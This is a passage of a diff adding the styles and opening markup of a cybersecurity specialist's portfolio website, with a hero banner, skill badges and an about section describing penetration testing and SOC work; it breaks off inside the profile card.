@@ -1,0 +1,2316 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Marcus Benard // Cybersecurity Specialist</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --bg:#030d12;--bg2:#041520;--bg3:#051c2a;
+  --panel:rgba(5,28,42,0.9);--border:#0e4a6e;
+  --c1:#00d4ff;--c2:#00ff88;--c3:#ff6b35;--c4:#ff3860;--c5:#b060ff;
+  --text:#b8dced;--dim:#3d7a99;--bright:#e8f8ff;
+  --mono:'Share Tech Mono',monospace;--sans:'Rajdhani',sans-serif;--title:'Orbitron',monospace;
+}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);overflow-x:hidden;}
+
+/* CURSOR */
+.cursor{position:fixed;width:20px;height:20px;border:1.5px solid var(--c1);border-radius:50%;pointer-events:none;z-index:99999;transform:translate(-50%,-50%);transition:transform 0.1s,border-color 0.2s,width 0.2s,height 0.2s;mix-blend-mode:screen;}
+.cursor-dot{position:fixed;width:4px;height:4px;background:var(--c1);border-radius:50%;pointer-events:none;z-index:99999;transform:translate(-50%,-50%);}
+body:has(a:hover) .cursor,.cursor.active{width:40px;height:40px;border-color:var(--c2);}
+
+/* SCANLINES */
+body::after{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,0.06) 3px,rgba(0,0,0,0.06) 4px);pointer-events:none;z-index:9998;}
+
+/* GRID BG */
+#grid-canvas{position:fixed;inset:0;z-index:0;opacity:0.4;}
+
+/* NAV */
+nav{position:fixed;top:0;left:0;right:0;z-index:1000;height:52px;display:flex;align-items:center;justify-content:space-between;padding:0 2rem;border-bottom:1px solid var(--border);background:rgba(3,13,18,0.95);backdrop-filter:blur(16px);}
+.nav-brand{font-family:var(--title);font-size:.75rem;font-weight:700;color:var(--c1);letter-spacing:4px;text-transform:uppercase;}
+.nav-brand em{color:var(--c2);font-style:normal;}
+.nav-links{display:flex;gap:1.5rem;list-style:none;}
+.nav-links a{font-family:var(--mono);font-size:.65rem;color:var(--dim);text-decoration:none;letter-spacing:2px;text-transform:uppercase;transition:color .2s;position:relative;}
+.nav-links a:hover{color:var(--c1);}
+.nav-links a::after{content:'';position:absolute;bottom:-2px;left:0;width:0;height:1px;background:var(--c1);transition:width .3s;}
+.nav-links a:hover::after{width:100%;}
+.nav-status{font-family:var(--mono);font-size:.6rem;color:var(--c2);letter-spacing:2px;display:flex;align-items:center;gap:.5rem;}
+.nav-status::before{content:'';width:6px;height:6px;background:var(--c2);border-radius:50%;animation:pulse 2s infinite;}
+
+/* BOOT SCREEN */
+#boot{position:fixed;inset:0;background:#000;z-index:9997;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:var(--mono);}
+.boot-logo{font-family:var(--title);font-size:clamp(1.5rem,4vw,3rem);color:var(--c1);letter-spacing:8px;margin-bottom:2rem;text-shadow:0 0 40px var(--c1);}
+.boot-lines{width:min(500px,90vw);text-align:left;}
+.boot-line{font-size:.7rem;color:var(--dim);margin:.15rem 0;opacity:0;transition:opacity .3s;}
+.boot-line.ok::after{content:' [OK]';color:var(--c2);}
+.boot-line.warn::after{content:' [WARN]';color:var(--c3);}
+.boot-bar{width:min(500px,90vw);height:2px;background:#111;margin-top:1.5rem;overflow:hidden;}
+.boot-bar-fill{height:100%;background:linear-gradient(90deg,var(--c1),var(--c2));width:0;transition:width .05s;}
+
+/* SECTIONS */
+.section{position:relative;z-index:1;padding:6rem 2rem;max-width:1200px;margin:0 auto;}
+
+/* HERO */
+#hero{min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding-top:52px;max-width:none;position:relative;}
+.hero-inner{max-width:1200px;margin:0 auto;width:100%;display:grid;grid-template-columns:1fr 1fr;gap:4rem;align-items:center;}
+.hero-tag{font-family:var(--mono);font-size:.7rem;color:var(--c2);letter-spacing:4px;margin-bottom:1rem;opacity:0;animation:fadeUp .6s .5s forwards;}
+.hero-name{font-family:var(--title);font-size:clamp(2.5rem,5vw,5.5rem);font-weight:900;line-height:1;color:var(--bright);margin-bottom:.5rem;opacity:0;animation:fadeUp .6s .7s forwards;}
+.hero-name span{color:var(--c1);display:block;}
+.hero-role{font-family:var(--mono);font-size:.85rem;color:var(--c1);letter-spacing:3px;margin-bottom:1.5rem;opacity:0;animation:fadeUp .6s .9s forwards;}
+.hero-desc{font-size:1rem;line-height:1.8;color:var(--text);max-width:460px;opacity:0;animation:fadeUp .6s 1.1s forwards;}
+.hero-badges{display:flex;flex-wrap:wrap;gap:.6rem;margin-top:1.8rem;opacity:0;animation:fadeUp .6s 1.3s forwards;}
+.badge{font-family:var(--mono);font-size:.6rem;padding:.3rem .7rem;border:1px solid var(--border);color:var(--dim);letter-spacing:2px;text-transform:uppercase;transition:all .2s;cursor:default;}
+.badge:hover{border-color:var(--c1);color:var(--c1);background:rgba(0,212,255,.05);}
+.hero-ctas{display:flex;gap:1rem;margin-top:2rem;opacity:0;animation:fadeUp .6s 1.5s forwards;}
+.btn{font-family:var(--mono);font-size:.7rem;padding:.7rem 1.5rem;letter-spacing:3px;text-transform:uppercase;text-decoration:none;border:1px solid;cursor:pointer;transition:all .25s;display:inline-block;}
+.btn-primary{border-color:var(--c1);color:var(--c1);background:transparent;}
+.btn-primary:hover{background:var(--c1);color:#000;}
+.btn-secondary{border-color:var(--border);color:var(--dim);background:transparent;}
+.btn-secondary:hover{border-color:var(--c2);color:var(--c2);}
+/* HERO VISUAL */
+.hero-visual{position:relative;height:480px;opacity:0;animation:fadeIn 1s 1.5s forwards;}
+.hero-orb{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:240px;height:240px;border-radius:50%;background:radial-gradient(circle,rgba(0,212,255,.12),transparent 70%);border:1px solid rgba(0,212,255,.2);animation:orbPulse 4s ease-in-out infinite;}
+.hero-orb::before{content:'';position:absolute;inset:-20px;border-radius:50%;border:1px dashed rgba(0,212,255,.12);animation:spin 20s linear infinite;}
+.hero-orb::after{content:'';position:absolute;inset:-40px;border-radius:50%;border:1px dashed rgba(0,255,136,.07);animation:spin 35s linear infinite reverse;}
+.hero-stats{position:absolute;display:flex;flex-direction:column;gap:1rem;}
+.hero-stats.left{left:0;top:50%;transform:translateY(-50%);}
+.hero-stats.right{right:0;top:50%;transform:translateY(-50%);}
+.stat-card{background:var(--panel);border:1px solid var(--border);padding:.8rem 1rem;min-width:130px;}
+.stat-num{font-family:var(--title);font-size:1.6rem;font-weight:900;color:var(--c1);}
+.stat-label{font-family:var(--mono);font-size:.55rem;color:var(--dim);letter-spacing:2px;text-transform:uppercase;margin-top:.2rem;}
+/* floating particles canvas */
+#particle-canvas{position:absolute;inset:0;pointer-events:none;}
+
+/* SECTION HEADERS */
+.s-header{margin-bottom:3rem;}
+.s-tag{font-family:var(--mono);font-size:.65rem;color:var(--c2);letter-spacing:4px;text-transform:uppercase;display:block;margin-bottom:.5rem;}
+.s-title{font-family:var(--title);font-size:clamp(1.8rem,3vw,2.8rem);font-weight:900;color:var(--bright);}
+.s-title span{color:var(--c1);}
+.s-line{width:60px;height:2px;background:linear-gradient(90deg,var(--c1),transparent);margin-top:.8rem;}
+
+/* ABOUT */
+#about{background:linear-gradient(180deg,var(--bg) 0%,var(--bg3) 100%);}
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:4rem;align-items:start;}
+.about-text p{line-height:1.9;margin-bottom:1rem;color:var(--text);}
+.about-text strong{color:var(--c1);}
+.profile-card{background:var(--panel);border:1px solid var(--border);padding:2rem;position:relative;overflow:hidden;}
+.profile-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--c1),var(--c2),var(--c5));}
+.profile-pic-wrap{width:100px;height:100px;border-radius:50%;border:2px solid var(--c1);margin:0 auto 1.5rem;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:radial-gradient(circle,rgba(0,212,255,.1),transparent);position:relative;overflow:hidden;}
+.profile-pic-wrap::after{content:'';position:absolute;inset:0;border-radius:50%;background:linear-gradient(135deg,rgba(0,212,255,.1),transparent);animation:spin 8s linear infinite;}
+.contact-row{display:flex;flex-direction:column;gap:.6rem;margin-top:1.2rem;}
+.contact-item{display:flex;align-items:center;gap:.8rem;font-family:var(--mono);font-size:.7rem;color:var(--text);}
+.contact-item .icon{color:var(--c1);font-size:.9rem;width:16px;text-align:center;}
+.contact-item a{color:var(--text);text-decoration:none;}
+.contact-item a:hover{color:var(--c1);}
+
+/* SKILLS */
+#skills{background:var(--bg);}
+.skills-tabs{display:flex;flex-wrap:wrap;gap:.5rem;margin-bottom:2.5rem;}
+.tab-btn{font-family:var(--mono);font-size:.65rem;padding:.5rem 1rem;border:1px solid var(--border);background:transparent;color:var(--dim);cursor:pointer;letter-spacing:2px;text-transform:uppercase;transition:all .2s;}
+.tab-btn.active,.tab-btn:hover{border-color:var(--c1);color:var(--c1);background:rgba(0,212,255,.05);}
+.skill-panel{display:none;}
+.skill-panel.active{display:block;}
+.skill-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1rem;}
+.skill-card{background:var(--panel);border:1px solid var(--border);padding:1.2rem;transition:all .3s;position:relative;overflow:hidden;cursor:pointer;}
+.skill-card::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(0,212,255,.04),transparent);transition:left .5s;}
+.skill-card:hover::before{left:100%;}
+.skill-card:hover{border-color:var(--c1);transform:translateY(-2px);}
+.skill-name{font-family:var(--mono);font-size:.75rem;color:var(--c1);letter-spacing:2px;margin-bottom:.4rem;}
+.skill-desc{font-size:.85rem;color:var(--text);line-height:1.6;}
+.skill-bar{height:2px;background:rgba(255,255,255,.05);margin-top:.8rem;overflow:hidden;}
+.skill-fill{height:100%;background:linear-gradient(90deg,var(--c1),var(--c2));width:0;transition:width 1.2s cubic-bezier(.4,0,.2,1);}
+.skill-level{font-family:var(--mono);font-size:.55rem;color:var(--dim);margin-top:.3rem;text-align:right;}
+
+/* INTERACTIVE SIMULATIONS */
+#simulations{background:var(--bg3);}
+.sim-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;}
+.sim-card{background:var(--panel);border:1px solid var(--border);overflow:hidden;cursor:pointer;transition:all .3s;position:relative;}
+.sim-card:hover{border-color:var(--c1);}
+.sim-card-header{padding:1rem 1.2rem;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
+.sim-card-title{font-family:var(--mono);font-size:.75rem;color:var(--c1);letter-spacing:2px;text-transform:uppercase;}
+.sim-tag{font-family:var(--mono);font-size:.55rem;padding:.2rem .6rem;border:1px solid;letter-spacing:2px;text-transform:uppercase;}
+.sim-tag.offensive{border-color:var(--c4);color:var(--c4);}
+.sim-tag.defensive{border-color:var(--c2);color:var(--c2);}
+.sim-tag.recon{border-color:var(--c3);color:var(--c3);}
+.sim-tag.forensics{border-color:var(--c5);color:var(--c5);}
+.sim-preview{height:200px;position:relative;background:#020a10;overflow:hidden;}
+.sim-launch{display:block;width:100%;padding:.8rem;font-family:var(--mono);font-size:.65rem;letter-spacing:3px;text-transform:uppercase;border:none;border-top:1px solid var(--border);background:transparent;color:var(--dim);cursor:pointer;transition:all .2s;}
+.sim-launch:hover{background:rgba(0,212,255,.05);color:var(--c1);}
+
+/* MODAL */
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:5000;display:none;align-items:center;justify-content:center;backdrop-filter:blur(6px);}
+.modal-overlay.open{display:flex;}
+.modal{background:var(--bg2);border:1px solid var(--border);width:min(900px,95vw);max-height:90vh;overflow-y:auto;position:relative;display:flex;flex-direction:column;}
+.modal-header{padding:1rem 1.5rem;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;background:var(--bg2);z-index:10;}
+.modal-title{font-family:var(--mono);font-size:.8rem;color:var(--c1);letter-spacing:3px;text-transform:uppercase;}
+.modal-close{background:none;border:1px solid var(--border);color:var(--dim);width:28px;height:28px;cursor:pointer;font-family:var(--mono);font-size:.9rem;transition:all .2s;display:flex;align-items:center;justify-content:center;}
+.modal-close:hover{border-color:var(--c4);color:var(--c4);}
+.modal-body{padding:1.5rem;flex:1;}
+
+/* TERMINAL */
+.terminal{background:#000;border:1px solid var(--border);font-family:var(--mono);font-size:.75rem;height:400px;overflow-y:auto;padding:1rem;position:relative;}
+.terminal::-webkit-scrollbar{width:4px;}
+.terminal::-webkit-scrollbar-track{background:#000;}
+.terminal::-webkit-scrollbar-thumb{background:var(--border);}
+.t-line{margin:.15rem 0;line-height:1.6;}
+.t-prompt{color:var(--c2);}
+.t-cmd{color:var(--bright);}
+.t-out{color:var(--text);}
+.t-warn{color:var(--c3);}
+.t-err{color:var(--c4);}
+.t-success{color:var(--c2);}
+.t-info{color:var(--c1);}
+.t-comment{color:var(--dim);}
+.t-cursor{display:inline-block;width:8px;height:14px;background:var(--c1);animation:blink 1s infinite;vertical-align:middle;}
+.terminal-controls{display:flex;gap:.5rem;padding:.8rem 1rem;border-bottom:1px solid var(--border);background:#0a0a0a;}
+.tc-btn{font-family:var(--mono);font-size:.6rem;padding:.3rem .8rem;border:1px solid var(--border);background:transparent;color:var(--dim);cursor:pointer;letter-spacing:2px;text-transform:uppercase;transition:all .2s;}
+.tc-btn:hover{border-color:var(--c1);color:var(--c1);}
+.tc-btn.running{border-color:var(--c3);color:var(--c3);}
+
+/* SOC DASHBOARD */
+.soc-grid{display:grid;grid-template-columns:2fr 1fr;gap:1rem;}
+.soc-panel{background:#000;border:1px solid var(--border);padding:1rem;}
+.soc-panel-title{font-family:var(--mono);font-size:.65rem;color:var(--c1);letter-spacing:3px;margin-bottom:1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border);}
+.alert-row{display:flex;align-items:center;gap:.8rem;padding:.4rem .5rem;border-left:3px solid transparent;margin:.2rem 0;font-family:var(--mono);font-size:.65rem;transition:all .2s;cursor:pointer;}
+.alert-row:hover{background:rgba(255,255,255,.03);}
+.alert-row.critical{border-color:var(--c4);}
+.alert-row.high{border-color:var(--c3);}
+.alert-row.medium{border-color:var(--c5);}
+.alert-row.low{border-color:var(--c2);}
+.alert-row.info{border-color:var(--dim);}
+.alert-sev{font-size:.55rem;padding:.1rem .4rem;border:1px solid;min-width:55px;text-align:center;}
+.alert-sev.critical{border-color:var(--c4);color:var(--c4);}
+.alert-sev.high{border-color:var(--c3);color:var(--c3);}
+.alert-sev.medium{border-color:var(--c5);color:var(--c5);}
+.alert-sev.low{border-color:var(--c2);color:var(--c2);}
+.alert-sev.info{border-color:var(--dim);color:var(--dim);}
+.alert-msg{flex:1;color:var(--text);}
+.alert-time{color:var(--dim);font-size:.6rem;}
+#threat-map-canvas{width:100%;height:200px;background:#000;}
+.metric-row{display:grid;grid-template-columns:1fr 1fr;gap:.5rem;margin-bottom:1rem;}
+.metric-box{background:rgba(0,0,0,.5);border:1px solid var(--border);padding:.8rem;text-align:center;}
+.metric-val{font-family:var(--title);font-size:1.4rem;font-weight:900;}
+.metric-val.red{color:var(--c4);}
+.metric-val.orange{color:var(--c3);}
+.metric-val.green{color:var(--c2);}
+.metric-val.blue{color:var(--c1);}
+.metric-label{font-family:var(--mono);font-size:.55rem;color:var(--dim);letter-spacing:2px;margin-top:.2rem;}
+
+/* NETWORK TOPOLOGY */
+#net-canvas{width:100%;height:350px;background:#000;border:1px solid var(--border);}
+.net-legend{display:flex;gap:1.5rem;margin-top:.8rem;flex-wrap:wrap;}
+.net-leg-item{display:flex;align-items:center;gap:.4rem;font-family:var(--mono);font-size:.6rem;color:var(--dim);}
+.net-dot{width:8px;height:8px;border-radius:50%;}
+
+/* NMAP SIM */
+.nmap-output{background:#000;border:1px solid var(--border);font-family:var(--mono);font-size:.7rem;padding:1rem;min-height:300px;}
+.nmap-header{color:var(--c2);margin-bottom:.8rem;}
+.port-row{display:flex;gap:1rem;padding:.2rem 0;align-items:center;}
+.port-num{color:var(--c1);min-width:80px;}
+.port-state{min-width:60px;}
+.port-state.open{color:var(--c2);}
+.port-state.closed{color:var(--c4);}
+.port-state.filtered{color:var(--c3);}
+.port-service{color:var(--text);}
+.port-banner{color:var(--dim);}
+.scan-bar{height:3px;background:var(--border);margin:.5rem 0;overflow:hidden;}
+.scan-progress{height:100%;background:linear-gradient(90deg,var(--c1),var(--c2));width:0;transition:width .1s;}
+.host-up{color:var(--c2);}
+
+/* OSINT */
+.osint-map{background:#020c12;border:1px solid var(--border);padding:1.5rem;font-family:var(--mono);}
+.osint-node{display:inline-block;padding:.3rem .8rem;border:1px solid;font-size:.65rem;margin:.3rem;cursor:pointer;transition:all .2s;}
+.osint-node.target{border-color:var(--c4);color:var(--c4);}
+.osint-node.domain{border-color:var(--c1);color:var(--c1);}
+.osint-node.email{border-color:var(--c2);color:var(--c2);}
+.osint-node.ip{border-color:var(--c3);color:var(--c3);}
+.osint-node.social{border-color:var(--c5);color:var(--c5);}
+.osint-node:hover{transform:scale(1.05);}
+#osint-canvas{width:100%;height:280px;}
+
+/* SECURE COMMS */
+.crypto-viz{background:#000;border:1px solid var(--border);padding:1.5rem;font-family:var(--mono);}
+.msg-flow{display:flex;align-items:center;gap:1rem;margin:1rem 0;flex-wrap:wrap;}
+.msg-node{background:var(--panel);border:1px solid var(--border);padding:.6rem 1rem;font-size:.7rem;text-align:center;min-width:100px;}
+.msg-node.sender{border-color:var(--c2);color:var(--c2);}
+.msg-node.encrypted{border-color:var(--c5);color:var(--c5);}
+.msg-node.tor{border-color:var(--c3);color:var(--c3);}
+.msg-node.receiver{border-color:var(--c1);color:var(--c1);}
+.arrow{color:var(--dim);font-size:1.2rem;}
+.hex-display{font-family:var(--mono);font-size:.6rem;color:var(--dim);word-break:break-all;background:#000;padding:.8rem;border:1px solid var(--border);margin-top:.8rem;max-height:80px;overflow:hidden;position:relative;}
+.hex-display::after{content:'';position:absolute;bottom:0;left:0;right:0;height:20px;background:linear-gradient(transparent,#000);}
+
+/* PROJECTS */
+#projects{background:var(--bg);}
+.proj-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;}
+.proj-card{background:var(--panel);border:1px solid var(--border);padding:1.5rem;position:relative;overflow:hidden;transition:all .3s;}
+.proj-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;}
+.proj-card.soc::before{background:linear-gradient(90deg,var(--c1),var(--c2));}
+.proj-card.comms::before{background:linear-gradient(90deg,var(--c5),var(--c3));}
+.proj-card.vuln::before{background:linear-gradient(90deg,var(--c4),var(--c3));}
+.proj-card.ml::before{background:linear-gradient(90deg,var(--c2),var(--c5));}
+.proj-card:hover{border-color:var(--c1);transform:translateY(-3px);}
+.proj-icon{font-size:2rem;margin-bottom:1rem;}
+.proj-title{font-family:var(--title);font-size:1rem;color:var(--bright);margin-bottom:.5rem;}
+.proj-desc{font-size:.9rem;color:var(--text);line-height:1.7;margin-bottom:1rem;}
+.proj-tags{display:flex;flex-wrap:wrap;gap:.4rem;}
+.proj-tag{font-family:var(--mono);font-size:.55rem;padding:.2rem .5rem;border:1px solid var(--border);color:var(--dim);letter-spacing:1px;}
+
+/* ACHIEVEMENTS */
+#achievements{background:var(--bg3);}
+.ach-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:1.5rem;}
+.ach-card{background:var(--panel);border:1px solid var(--border);padding:1.5rem;text-align:center;transition:all .3s;position:relative;overflow:hidden;}
+.ach-card:hover{border-color:var(--c2);transform:translateY(-3px);}
+.ach-card::after{content:'';position:absolute;inset:0;background:radial-gradient(circle at 50% 100%,var(--glow2),transparent 70%);opacity:0;transition:opacity .3s;}
+.ach-card:hover::after{opacity:1;}
+.ach-org{font-family:var(--title);font-size:1rem;color:var(--c1);margin-bottom:.5rem;}
+.ach-title{font-family:var(--mono);font-size:.7rem;color:var(--c2);letter-spacing:2px;text-transform:uppercase;margin-bottom:1rem;}
+.ach-body{font-size:.9rem;color:var(--text);line-height:1.7;}
+.ach-badge{width:60px;height:60px;border-radius:50%;border:2px solid;display:flex;align-items:center;justify-content:center;font-size:1.5rem;margin:0 auto 1rem;position:relative;}
+.ach-badge.gold{border-color:#ffd700;box-shadow:0 0 20px rgba(255,215,0,.2);}
+.ach-badge.silver{border-color:#c0c0c0;box-shadow:0 0 20px rgba(192,192,192,.2);}
+
+/* CERT TIMELINE */
+#certifications{background:var(--bg);}
+.timeline{position:relative;padding-left:2rem;}
+.timeline::before{content:'';position:absolute;left:0;top:0;bottom:0;width:1px;background:linear-gradient(180deg,var(--c1),var(--c2),transparent);}
+.tl-item{position:relative;margin-bottom:2rem;padding-left:1.5rem;}
+.tl-dot{position:absolute;left:-2rem;top:4px;width:12px;height:12px;border-radius:50%;border:2px solid var(--c1);background:var(--bg);transform:translateX(2px);}
+.tl-dot.active{background:var(--c1);box-shadow:0 0 10px var(--c1);}
+.tl-date{font-family:var(--mono);font-size:.65rem;color:var(--c2);letter-spacing:2px;margin-bottom:.3rem;}
+.tl-title{font-family:var(--sans);font-weight:600;font-size:1rem;color:var(--bright);margin-bottom:.3rem;}
+.tl-body{font-size:.9rem;color:var(--text);line-height:1.6;}
+.tl-status{display:inline-block;font-family:var(--mono);font-size:.55rem;padding:.2rem .6rem;border:1px solid;margin-top:.5rem;letter-spacing:2px;text-transform:uppercase;}
+.tl-status.pursuing{border-color:var(--c3);color:var(--c3);}
+.tl-status.completed{border-color:var(--c2);color:var(--c2);}
+
+/* ETHICS */
+#ethics{background:var(--bg3);}
+.ethics-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;}
+.eth-card{background:var(--panel);border:1px solid var(--border);padding:1.2rem;position:relative;overflow:hidden;}
+.eth-icon{font-size:1.5rem;margin-bottom:.8rem;}
+.eth-title{font-family:var(--mono);font-size:.7rem;color:var(--c1);letter-spacing:2px;text-transform:uppercase;margin-bottom:.5rem;}
+.eth-text{font-size:.85rem;color:var(--text);line-height:1.6;}
+
+/* CONTACT */
+#contact{background:var(--bg);}
+.contact-grid{display:grid;grid-template-columns:1fr 1fr;gap:4rem;align-items:start;}
+.contact-links{display:flex;flex-direction:column;gap:1rem;margin-top:2rem;}
+.c-link{display:flex;align-items:center;gap:1rem;padding:1rem;background:var(--panel);border:1px solid var(--border);text-decoration:none;transition:all .3s;color:var(--text);}
+.c-link:hover{border-color:var(--c1);transform:translateX(6px);}
+.c-link-icon{font-size:1.2rem;color:var(--c1);min-width:24px;text-align:center;}
+.c-link-label{font-family:var(--mono);font-size:.65rem;color:var(--dim);letter-spacing:2px;display:block;margin-bottom:.2rem;}
+.c-link-val{font-size:.9rem;color:var(--text);}
+/* Availability meter */
+.avail-box{background:var(--panel);border:1px solid var(--c2);padding:1.5rem;margin-top:2rem;position:relative;overflow:hidden;}
+.avail-box::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--c2),var(--c1));}
+.avail-title{font-family:var(--mono);font-size:.65rem;color:var(--c2);letter-spacing:3px;margin-bottom:1rem;}
+.avail-item{display:flex;align-items:center;justify-content:space-between;margin:.6rem 0;}
+.avail-label{font-family:var(--mono);font-size:.65rem;color:var(--text);}
+.avail-dot{width:8px;height:8px;border-radius:50%;background:var(--c2);animation:pulse 2s infinite;}
+.avail-dot.partial{background:var(--c3);}
+
+/* FOOTER */
+footer{border-top:1px solid var(--border);padding:2rem;text-align:center;font-family:var(--mono);font-size:.65rem;color:var(--dim);letter-spacing:2px;}
+footer span{color:var(--c1);}
+
+/* SCROLL REVEAL */
+.reveal{opacity:0;transform:translateY(30px);transition:opacity .7s,transform .7s;}
+.reveal.visible{opacity:1;transform:none;}
+
+/* ANIMATIONS */
+@keyframes fadeUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:none;}}
+@keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+@keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:.5;transform:scale(.8);}}
+@keyframes orbPulse{0%,100%{box-shadow:0 0 40px rgba(0,212,255,.15);}50%{box-shadow:0 0 80px rgba(0,212,255,.3);}}
+@keyframes dataStream{0%{transform:translateY(-100%);}100%{transform:translateY(100vh);}}
+@keyframes glitch{0%,100%{clip-path:inset(0 0 95% 0);}5%{clip-path:inset(30% 0 40% 0);}10%{clip-path:inset(80% 0 5% 0);}15%{clip-path:inset(10% 0 75% 0);}20%{clip-path:inset(50% 0 30% 0);}to{clip-path:inset(0 0 95% 0);}}
+@keyframes slideIn{from{transform:translateX(-10px);opacity:0;}to{transform:none;opacity:1;}}
+@keyframes float{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}
+
+/* RESPONSIVE */
+@media(max-width:768px){
+  .hero-inner,.about-grid,.sim-grid,.proj-grid,.contact-grid{grid-template-columns:1fr;}
+  .ach-grid,.ethics-grid{grid-template-columns:1fr 1fr;}
+  .hero-visual{display:none;}
+  nav{padding:0 1rem;}
+  .nav-links{gap:1rem;}
+  .nav-links a{font-size:.55rem;}
+}
+@media(max-width:480px){
+  .ach-grid,.ethics-grid{grid-template-columns:1fr;}
+}
+
+/* TOOLTIP */
+.tooltip{position:absolute;background:var(--bg2);border:1px solid var(--c1);padding:.4rem .8rem;font-family:var(--mono);font-size:.6rem;color:var(--c1);white-space:nowrap;z-index:100;pointer-events:none;opacity:0;transition:opacity .2s;}
+</style>
+</head>
+<body>
+
+<!-- Custom cursor -->
+<div class="cursor" id="cursor"></div>
+<div class="cursor-dot" id="cursorDot"></div>
+
+<!-- Grid background -->
+<canvas id="grid-canvas"></canvas>
+
+<!-- Boot screen -->
+<div id="boot">
+  <div class="boot-logo">MB//SEC</div>
+  <div class="boot-lines" id="boot-lines"></div>
+  <div class="boot-bar"><div class="boot-bar-fill" id="boot-bar-fill"></div></div>
+</div>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-brand">MARCUS.<em>BENARD</em></div>
+  <ul class="nav-links">
+    <li><a href="#about">Profile</a></li>
+    <li><a href="#skills">Skills</a></li>
+    <li><a href="#simulations">Simulations</a></li>
+    <li><a href="#projects">Projects</a></li>
+    <li><a href="#achievements">Intel</a></li>
+    <li><a href="#contact">Contact</a></li>
+  </ul>
+  <div class="nav-status" id="nav-status">SECURE // ONLINE</div>
+</nav>
+
+<!-- MAIN -->
+<main style="position:relative;z-index:1;">
+
+<!-- HERO -->
+<section id="hero" style="padding:0 2rem;">
+  <div class="hero-inner">
+    <div class="hero-text">
+      <div class="hero-tag">// CYBERSECURITY SPECIALIST — NAIROBI, KENYA</div>
+      <h1 class="hero-name">MARCUS<span>BENARD</span></h1>
+      <div class="hero-role">OFFENSIVE SEC // DEFENSIVE ARCH // FORENSICS</div>
+      <p class="hero-desc">Multi-spectrum cybersecurity professional. Identifies what others miss. Builds what others overlook. Operates where precision and ethics converge.</p>
+      <div class="hero-badges">
+        <span class="badge">Penetration Testing</span>
+        <span class="badge">SIEM/SOAR/XDR</span>
+        <span class="badge">OSINT</span>
+        <span class="badge">Digital Forensics</span>
+        <span class="badge">SOC Engineering</span>
+        <span class="badge">Threat Intelligence</span>
+      </div>
+      <div class="hero-ctas">
+        <a href="#simulations" class="btn btn-primary">▶ LAUNCH SIMULATIONS</a>
+        <a href="#contact" class="btn btn-secondary">HIRE / CONTACT</a>
+      </div>
+    </div>
+    <div class="hero-visual">
+      <canvas id="particle-canvas"></canvas>
+      <div class="hero-orb"></div>
+      <div class="hero-stats left">
+        <div class="stat-card"><div class="stat-num" id="stat-vulns">0</div><div class="stat-label">Vulns Discovered</div></div>
+        <div class="stat-card"><div class="stat-num" id="stat-orgs">0</div><div class="stat-label">Orgs Secured</div></div>
+      </div>
+      <div class="hero-stats right">
+        <div class="stat-card"><div class="stat-num" id="stat-tools">0</div><div class="stat-label">Security Tools</div></div>
+        <div class="stat-card"><div class="stat-num" id="stat-yrs">0</div><div class="stat-label">Years Active</div></div>
+      </div>
+    </div>
+  </div>
+  <!-- Data stream lines -->
+  <div id="data-streams" style="position:absolute;inset:0;overflow:hidden;pointer-events:none;z-index:-1;"></div>
+</section>
+
+<!-- ABOUT -->
+<section id="about" class="section">
+  <div class="s-header reveal">
+    <span class="s-tag">// 01_PROFILE</span>
+    <h2 class="s-title">About <span>Marcus</span></h2>
+    <div class="s-line"></div>
+  </div>
+  <div class="about-grid reveal">
+    <div class="about-text">
+      <p>A dedicated cybersecurity professional with expertise in <strong>offensive security</strong>, <strong>penetration testing</strong>, and <strong>vulnerability assessment</strong>. Demonstrated success in identifying and responsibly disclosing critical security vulnerabilities to major Kenyan institutions.</p>
+      <p>Multi-faceted IT and Security Professional specializing in the architecture of open-source <strong>SIEM</strong> and <strong>XDR</strong> solutions. Expert in leveraging the ELK/Elastic Stack (Wazuh) in tandem with Zeek for network analysis and n8n for SOAR automation.</p>
+      <p>Proven ability to build comprehensive security monitoring platforms through a <strong>fully operational homelab SOC</strong>. Proficient in offensive security methodologies and defensive deployments with deep understanding of secure communication protocols and anonymity networks.</p>
+      <p>Committed to continuous learning and adhering to the highest ethical standards in all cybersecurity practices.</p>
+    </div>
+    <div class="profile-card">
+      <div style="text-align:center;">
+        <div class="profile-pic-wrap">🛡</div>
+        <div style="font-family:var(--title);font-size:1.1rem;color:var(--bright);margin-bottom:.2rem;">Marcus Benard</div>
